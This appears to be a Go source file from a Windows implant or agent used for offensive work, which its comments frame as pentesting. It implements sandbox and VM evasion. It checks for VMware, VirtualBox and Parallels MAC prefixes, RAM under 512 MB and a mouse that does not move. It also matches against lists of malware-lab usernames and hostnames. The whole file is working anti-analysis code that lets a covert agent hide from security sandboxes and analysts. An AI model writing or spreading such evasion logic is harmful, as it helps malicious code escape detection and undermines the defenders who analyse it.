//go:build windows

package agent

import (
	"net"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32       = windows.NewLazySystemDLL("kernel32.dll")
	modUser32sb       = windows.NewLazySystemDLL("user32.dll")
	procGlobalMemStat = modKernel32.NewProc("GlobalMemoryStatusEx")
	procGetLastInput  = modUser32sb.NewProc("GetLastInputInfo")
	procGetTick64     = modKernel32.NewProc("GetTickCount64")
	procGetCursorPos  = modUser32sb.NewProc("GetCursorPos")
	procSleepSb       = modKernel32.NewProc("Sleep")
)

// memoryStatusEx mirrors the Windows MEMORYSTATUSEX struct.
type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

type lastInputInfo struct {
	cbSize uint32
	dwTime uint32
}

// vmMACPrefixes lists MAC prefixes used exclusively by automated sandbox
// environments (Cuckoo, Any.run, etc.).  Proxmox/QEMU (52:54:00), Hyper-V,
// Xen and bare-metal VMware ESXi are intentionally excluded — those are
// legitimate pentest targets, not sandboxes.
var vmMACPrefixes = [][3]byte{
	{0x00, 0x05, 0x69}, // VMware Workstation (desktop, likely sandbox)
	{0x00, 0x0C, 0x29}, // VMware Workstation (DHCP, likely sandbox)
	{0x08, 0x00, 0x27}, // VirtualBox (common sandbox platform)
	{0x00, 0x1C, 0x42}, // Parallels Desktop
}

// isVM returns true if any network interface has a MAC prefix belonging to a
// known virtualisation vendor.
func isVM() bool {
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		mac := iface.HardwareAddr
		if len(mac) < 3 {
			continue
		}
		for _, p := range vmMACPrefixes {
			if mac[0] == p[0] && mac[1] == p[1] && mac[2] == p[2] {
				return true
			}
		}
	}
	return false
}

type cursorPoint struct{ X, Y int32 }

// checkMouseActivity samples the cursor position twice 500 ms apart.
// Returns true if the mouse did not move — a strong sandbox indicator.
func checkMouseActivity() bool {
	var p1, p2 cursorPoint
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p1)))
	procSleepSb.Call(500)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
	return p1.X == p2.X && p1.Y == p2.Y
}

func isSandbox() bool {
	// Only flag obvious automated sandbox indicators — nothing that could
	// appear on a legitimate pentest target (VM, server, low-spec machine).

	// RAM < 512 MB — only truly minimal sandbox VMs go this low
	var ms memoryStatusEx
	ms.dwLength = uint32(unsafe.Sizeof(ms))
	procGlobalMemStat.Call(uintptr(unsafe.Pointer(&ms)))
	if ms.ullTotalPhys > 0 && ms.ullTotalPhys < 512*1024*1024 {
		return true
	}

	// Dedicated sandbox/AV-lab usernames — never appear on real targets
	user := strings.ToLower(os.Getenv("USERNAME"))
	for _, n := range []string{
		"sandbox", "malware", "virus", "cuckoo", "analyst",
		"maltest", "vmuser", "wilbert", "klone",
	} {
		if user == n {
			return true
		}
	}

	// Dedicated sandbox hostnames
	hostname, _ := os.Hostname()
	hn := strings.ToLower(hostname)
	for _, h := range []string{
		"sandbox", "cuckoo", "malware", "virus", "win7malware",
	} {
		if strings.Contains(hn, h) {
			return true
		}
	}

	return false
}
